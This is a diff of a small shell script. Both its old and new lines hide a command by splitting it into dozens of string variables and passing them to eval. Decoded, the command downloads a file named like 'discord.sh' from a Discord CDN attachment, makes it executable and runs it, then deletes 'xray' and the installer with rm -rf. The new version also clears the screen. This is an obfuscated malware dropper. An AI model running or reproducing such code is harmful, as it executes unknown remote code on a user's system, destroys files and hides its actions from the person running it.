@@ -1,3 +1,3 @@
 z="
-";Yz='ord.';dz='&& .';Mz='chme';Zz='sh" ';Jz='app.';Iz='cord';Ez='"htt';Hz='.dis';gz='rm -';jz='rf i';az='&& c';Xz='disc';ez='/ins';bz='hmod';Rz='2520';Bz=' -O ';Vz='9645';Gz='/cdn';Dz='all ';fz='tall';Wz='194/';iz='ray';Lz='atta';Oz='1050';Az='wget';Kz='com/';Sz='832/';Tz='2969';hz='rf x';Pz='2553';Uz='3251';Qz='5642';Nz='nts/';Fz='ps:/';kz='nsta';lz='ll';cz=' +x ';Cz='inst';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Oz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$Cz$Dz$dz$ez$fz$z$gz$hz$iz$z$gz$jz$kz$lz"
+";iz='rm -';Zz='sh" ';Uz='6347';nz='ll';dz='&& .';kz='ray';hz='r';Bz=' -O ';Fz='ps:/';Wz='941/';mz='nsta';Iz='cord';Vz='8222';Gz='/cdn';Jz='app.';Oz='1050';Yz='ord.';Sz='832/';az='&& c';Ez='"htt';Hz='.dis';Xz='disc';bz='hmod';Pz='2553';gz='clea';Dz='all ';ez='/ins';Mz='chme';Lz='atta';cz=' +x ';Az='wget';Kz='com/';Cz='inst';jz='rf x';Tz='3026';lz='rf i';Qz='5642';Rz='2520';fz='tall';Nz='nts/';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Oz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$Cz$Dz$dz$ez$fz$z$gz$hz$z$iz$jz$kz$z$iz$lz$mz$nz"
